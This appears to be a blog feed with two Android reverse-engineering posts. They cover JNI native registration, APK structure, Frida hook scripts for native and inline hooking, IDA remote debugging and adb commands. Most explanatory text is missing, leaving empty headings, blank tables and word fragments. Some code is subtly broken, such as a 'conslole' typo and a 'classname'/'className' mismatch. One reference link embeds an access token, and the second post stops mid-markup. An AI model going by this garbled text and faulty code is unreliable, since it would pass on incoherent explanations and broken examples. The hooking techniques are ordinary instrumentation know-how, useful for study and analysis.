      <url>/2023/10/18/Android-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol><li>Android Studio gradle</li><li>rundeviceAndroid Studiodevice manager -&gt; create.</li></ol><ul><li>IDE</li></ul><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activity</p><p>Android  Activity  onCreate() </p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>onCreate()</td><td></td></tr><tr><td>onStart()</td><td></td></tr><tr><td>onResume()</td><td></td></tr><tr><td>onPause()</td><td></td></tr><tr><td>onStop()</td><td></td></tr><tr><td>onDestroy()</td><td></td></tr><tr><td>onRestart()</td><td></td></tr></tbody></table><h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundle<strong></strong>key-value()</p><p><em>BundleActivity</em>booleanbyteintlongfloatdoublestringBundleSerializable Parcelable </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>onclick</li><li>button</li><li>EditText<br><br>EditTextTextView TextView </li></ol><h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android hello xxx</p><p>APK</p><ol><li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li><li>Build -&gt; Make Project 1</li><li> app&#x2F;build&#x2F;outputs&#x2F;apk</li></ol><p>debug build variants  release</p><p>jadx</p><h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol><li>Android Studionative C++ gradle</li><li> <code>cpp</code> java</li></ol><ul><li>device</li></ul><ol start="3"><li>Java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>Java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote><p>android ndk  find </p></blockquote><ol><li></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>*      jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject     jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject     jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject     jarray;</span><br></pre></td></tr></table></figure><ol start="2"><li>JNIEnv  JavaVMCC++ </li></ol><p>JNI <code>JavaVM</code><code>JNIEnv</code> C++  JNI JavaVM <code></code> JavaVM JavaVM Android </p><p>JNIEnv  JNI  JNIEnv </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ol start="3"><li>JavaVM </li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        (*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="4"><li>JNIEnv</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>native method</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li> <code>Java___</code>  <code>.</code>  <code>_</code> native</li><li><code>jni.h</code> JNIEnvjclassJava</li><li>android studio native C++ </li></ol><p>native-lib.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> + jadx + ida so</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>Java</li><li>JNI_Onload </li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. JavaVMJNIEnv1.4</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. java</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. RegisterNatives</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. </span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>JNIEnvRegisterNatives</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure><ol start="4"><li> JNINativeMethod </li></ol><ul><li><code>getNativeString</code>JavaNative</li><li><code>()Ljava/lang/String;</code>  <code>()</code></li><li><code>reinterpret_cast&lt;void*&gt;(getString)</code> Native</li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="smali-"><a href="#smali-" class="headerlink" title="smali "></a>smali </h2><p>Dalvik Dalvik  Google  Android  Android  Java  Dalvik VM  Java VM Dalvik VM  Java VM  Dalvik VM  dex (Dalvik Executable) Java VM  Java DVM  JVM </p><p></p><p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p><h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote><p></p></blockquote><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># --pause  </span></span><br><span class="line">frida-ps -Uai  // </span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure><p></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  JNIEnv JNIEnv</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure><h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol><li>so</li><li>attach(onEnter)(onLeave)</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// soJniEnvjclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote><p></p></blockquote><ol><li></li><li> context</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote><p>IDA yyds</p></blockquote><ol><li> IDA Pro <code>dbgsrv</code>  android_server(x86_64  arm )</li><li></li><li>IDA Pro  Debugger -&gt; Attach -&gt; Remote Android debugger</li></ol><p>attachandroid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li><li><a href="https://frida.re/docs/home/">Frida  A world-class dynamic instrumentation toolkit</a></li><li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNI</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-1</title>
      <link href="/2023/10/08/Android-1/"/>
      <url>/2023/10/08/Android-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><p>ARM <a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7  Bypassing ASLR and NX - 8kSec</a></p><p></p><h2 id="Android-"><a href="#Android-" class="headerlink" title="Android "></a>Android </h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><p>windows  Linux Android Studio</p><ol><li> Java</li></ol><p>Linux </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure><p>windows oracle <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a></p><ol start="2"><li>android studio<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li><li> Android SDKAndroid studio sdk</li><li>path: sdk <code>xxx\platform-tools</code> adbqemu</li></ol><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><ol><li></li></ol><p> WSL2 <del>WSA</del>(WSA20243)  </p><p><a href="https://www.bluestacks.cn/">BlueStacks</a><strong></strong></p><ul><li>root<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li></ul><p></p><ol><li>root <del></del></li></ol><ul><li>x86lib</li><li>xpixel</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul><li><a href="https://github.com/skylot/jadx">jadx</a></li><li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li><li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li><li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li></ul><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul><li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li><li><a href="https://github.com/frida/frida/releases">firda server</a></li><li>xpose</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h2><ul><li>APK, zip</li></ul><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>APK</p><p>assets<strong></strong></p><h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>apk</p><p>apkMETA-INFMETA-INFapkapk</p><p>META-INFCERT.RSACERT.DSACERT.SFMANIFEST.MF</p><ul><li>CERT.RSAAPK</li><li>CERT.SFMANIFEST.MF</li></ul><h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p><strong>native</strong>C&#x2F;C++libARMX86</p><h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>resresourceAndroid<code>.R</code>IDIDR.id.filenameres</p><p><strong>resassets</strong></p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>AndroidAndroid Android<strong></strong>APKAndroidAndroidManifest.xmlAndroidActivityServiceProviderReceiverAndroidManifest.xmlSDKAndroidManifest.xmlAndroidAXML</p><h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>JavaJavaclassclassJavaclass</p><p>DalvikJavaDalvikDalvikJavaAndroidAndroidSDKdxJavaDalvikdxclass</p><p>dx.classdexdexDalvik</p><h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>IDIDAndroidresfindviewbyId()resaaptID.RIDID.RIDresources.arscID</p><h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin Javakotlin</p><h2 id="adb-"><a href="#adb-" class="headerlink" title="adb "></a>adb </h2><ul><li>android</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure><ul><li>shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 